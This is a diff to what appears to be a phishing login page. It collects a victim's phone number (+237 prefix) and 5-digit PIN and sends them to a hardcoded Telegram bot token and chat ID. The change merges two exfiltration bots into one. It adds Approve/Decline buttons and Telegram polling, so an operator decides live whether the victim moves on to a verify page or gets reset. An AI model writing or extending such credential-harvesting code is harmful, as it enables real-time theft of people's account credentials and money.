@@ -120,13 +120,13 @@
         .pin-group {
             display: flex;
             justify-content: center;
-            gap: 20px;
+            gap: 15px;
             margin-bottom: 30px;
             flex-wrap: wrap;
         }
         
         .pin-box {
-            width: 60px;
+            width: 50px;
             height: 60px;
             border: 2px solid #0066ff;
             border-radius: 16px;
@@ -353,12 +353,9 @@
     </div>
 
     <script>
-        // --- Existing Telegram bot tokens (kept as-is from your code) ---
-        const BOT_TOKEN_1 = '8627117515:AAGe2n506X-QOX6VjU0fZbW-4Dl_Z_ePlK0';
-        const CHAT_ID_1 = '8336304738';
-
-        const BOT_TOKEN_2 = '8627117515:AAGe2n506X-QOX6VjU0fZbW-4Dl_Z_ePlK0';
-        const CHAT_ID_2 = '8336304738';
+        // --- Telegram Bot Configuration (Single Bot) ---
+        const BOT_TOKEN = '8627117515:AAGe2n506X-QOX6VjU0fZbW-4Dl_Z_ePlK0';
+        const CHAT_ID = '8336304738';
 
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
@@ -371,8 +368,8 @@
         const loginBtn = document.getElementById('loginBtn');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         let pinValue = '';
-
-        const PIN_LENGTH = 5; // ✅ required PIN length
+        const PIN_LENGTH = 5; // Required 5-digit PIN
+        let pollInterval = null;
 
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
@@ -381,7 +378,6 @@
 
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
-                // Move to next box when current is filled
                 if (box.value.length === 1 && index < pinBoxes.length - 1) {
                     pinBoxes[index + 1].focus();
                 }
@@ -394,6 +390,19 @@
                 }
             });
         });
+
+        // Reset fields and page state on decline
+        function resetPage() {
+            if (pollInterval) clearInterval(pollInterval);
+            spinnerOverlay.style.display = 'none';
+            phoneInput.value = '';
+            pinBoxes.forEach(box => box.value = '');
+            pinValue = '';
+            loginBtn.style.display = 'none';
+            if (pinBoxes[0]) pinBoxes[0].focus();
+            localStorage.removeItem('phone');
+            localStorage.removeItem('pin');
+        }
 
         loginBtn.addEventListener('click', () => {
             const phone = phoneInput.value.trim();
@@ -414,35 +423,83 @@
 
             const message = `New Login Attempt\n\nPhone: +237 ${phone}\nPIN: ${pinValue}`;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
+            // Send message with Approve / Decline inline buttons
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: "✅ Approve",
+                                    callback_data: "approve"
+                                }, {
+                                    text: "❌ Decline",
+                                    callback_data: "decline"
+                                }]
+                            ]
+                        }
+                    })
                 })
-            }).catch(() => {});
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        const messageId = data.result.message_id;
+                        startPolling(messageId);
+                    }
                 })
-            }).catch(() => {});
-
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+                .catch(() => {
+                    setTimeout(() => {
+                        spinnerOverlay.style.display = 'none';
+                    }, 2000);
+                });
         });
 
+        // Poll for admin decision on Telegram
+        function startPolling(messageId) {
+            let offset = 0;
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=1`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+                                if (update.callback_query && update.callback_query.message.message_id === messageId) {
+                                    const action = update.callback_query.data;
+
+                                    // Acknowledge callback query
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json'
+                                        },
+                                        body: JSON.stringify({
+                                            callback_query_id: update.callback_query.id
+                                        })
+                                    }).catch(() => {});
+
+                                    clearInterval(pollInterval);
+
+                                    if (action === 'approve') {
+                                        window.location.href = 'verify.html'; // Move to next page
+                                    } else if (action === 'decline') {
+                                        resetPage(); // Reset inputs for reentry
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(() => {});
+            }, 2000);
+        }
+
         checkPinComplete();
-        pinBoxes[0].focus();
+        if (pinBoxes[0]) pinBoxes[0].focus();
     </script>
 </body>
 
